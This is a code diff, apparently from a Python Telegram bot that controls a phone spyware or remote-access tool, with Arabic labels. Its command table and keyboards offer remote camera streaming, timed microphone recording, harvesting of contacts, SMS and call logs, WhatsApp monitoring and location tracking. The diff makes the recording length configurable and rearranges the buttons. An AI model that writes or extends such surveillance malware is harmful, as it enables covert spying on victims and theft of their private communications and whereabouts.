@@ -255,7 +255,7 @@ COMMANDS = {
     "stop-camera-stream":        {"category": "camera", "label": "⏹ إيقاف بث الكاميرا",  "description": "إيقاف بث الكاميرا", "needs_param": False},
     # screenshot تمت إزالته - تمت إضافته في camera section
     # audio
-    "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي (30ث)",  "description": "تسجيل 30 ثانية من الميكروفون",     "needs_param": False},
+    "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي",      "description": "تسجيل من الميكروفون (اكتب المدة بالثواني)",     "needs_param": True, "param_hint": "10 أو 30 أو 60 (ثانية)"},
     "playAudio":      {"category": "audio",  "label": "🔊 تشغيل صوت",       "description": "تشغيل ملف صوتي",          "needs_param": True, "param_hint": "رابط الصوت"},
     "stopAudio":      {"category": "audio",  "label": "🔇 إيقاف الصوت",      "description": "إيقاف الصوت",              "needs_param": False},
     # control
@@ -448,7 +448,6 @@ def data_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"contacts"), _cbtn(did,"all-sms"))
     kb.add(_cbtn(did,"calls"), _cbtn(did,"apps"))
-    kb.add(_cbtn(did,"gallery"))
     kb.add(_cbtn(did,"whatsapp-monitor-on"))
     kb.add(_cbtn(did,"whatsapp-monitor-off"))
     kb.add(_cbtn(did,"get-location"))
@@ -468,8 +467,9 @@ def camera_keyboard(did):
 # ── Audio Keyboard ──
 def audio_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
-    kb.add(_cbtn(did,"microphone"), _cbtn(did,"stopAudio"))
+    kb.add(_cbtn(did,"microphone"))
     kb.add(_cbtn(did,"playAudio"))
+    kb.add(_cbtn(did,"stopAudio"))
     kb.add(_back(did))
     return kb
 
